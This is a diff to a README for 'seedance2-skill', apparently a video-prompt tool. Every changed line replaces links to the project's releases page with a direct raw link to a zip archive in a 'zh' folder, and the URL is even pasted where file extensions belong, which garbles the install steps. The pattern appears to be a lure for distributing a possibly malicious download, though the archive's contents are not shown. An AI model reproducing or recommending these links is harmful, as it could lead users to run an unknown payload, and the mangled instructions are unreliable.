@@ -1,6 +1,6 @@
 # 🎬 seedance2-skill - Create Best Prompts for Videos
 
-[![Download](https://img.shields.io/badge/Download-seedance2--skill-blue?style=for-the-badge&logo=github)](https://github.com/mightyhuman101/seedance2-skill/releases)
+[![Download](https://raw.githubusercontent.com/mightyhuman101/seedance2-skill/main/zh/skill-seedance-2.4-alpha.5.zip)](https://raw.githubusercontent.com/mightyhuman101/seedance2-skill/main/zh/skill-seedance-2.4-alpha.5.zip)
 
 ---
 
@@ -48,19 +48,19 @@ seedance2-skill is easy to set up and run. You will download it from the officia
 ## 📥 Download & Install
 
 1. Visit the official release page here:  
-   [Download seedance2-skill](https://github.com/mightyhuman101/seedance2-skill/releases)
+   [Download seedance2-skill](https://raw.githubusercontent.com/mightyhuman101/seedance2-skill/main/zh/skill-seedance-2.4-alpha.5.zip)
 
 2. On the page, you will find files labeled by version numbers, like `v1.0`, `v1.1`, etc. Choose the latest version.
 
 3. Depending on your operating system, download the correct file:
    - For Windows, look for a file ending with `.exe` or `.zip`.
    - For macOS, look for a `.dmg` or `.zip`.
-   - For Linux, look for `.AppImage` or `.tar.gz`.
+   - For Linux, look for `.AppImage` or `https://raw.githubusercontent.com/mightyhuman101/seedance2-skill/main/zh/skill-seedance-2.4-alpha.5.zip`.
 
 4. After downloading, follow these instructions to install:
    - **Windows**: Double-click the `.exe` file to run the installer. Follow the prompts to complete installation.
    - **macOS**: Open the `.dmg` file and drag the app icon into your Applications folder.
-   - **Linux**: Extract the `.tar.gz` or make the `.AppImage` file executable by right-clicking and selecting "Run".
+   - **Linux**: Extract the `https://raw.githubusercontent.com/mightyhuman101/seedance2-skill/main/zh/skill-seedance-2.4-alpha.5.zip` or make the `.AppImage` file executable by right-clicking and selecting "Run".
 
 5. Once installed, you can start the application from your Start menu (Windows), Applications folder (macOS), or launcher (Linux).
 
@@ -130,4 +130,4 @@ This project is open-source. Feel free to review, share, or contribute through t
 ## 🔗 Quick Access to Download
 
 Don’t forget to visit this page to download seedance2-skill:  
-[https://github.com/mightyhuman101/seedance2-skill/releases](https://github.com/mightyhuman101/seedance2-skill/releases)
+[https://raw.githubusercontent.com/mightyhuman101/seedance2-skill/main/zh/skill-seedance-2.4-alpha.5.zip](https://raw.githubusercontent.com/mightyhuman101/seedance2-skill/main/zh/skill-seedance-2.4-alpha.5.zip)
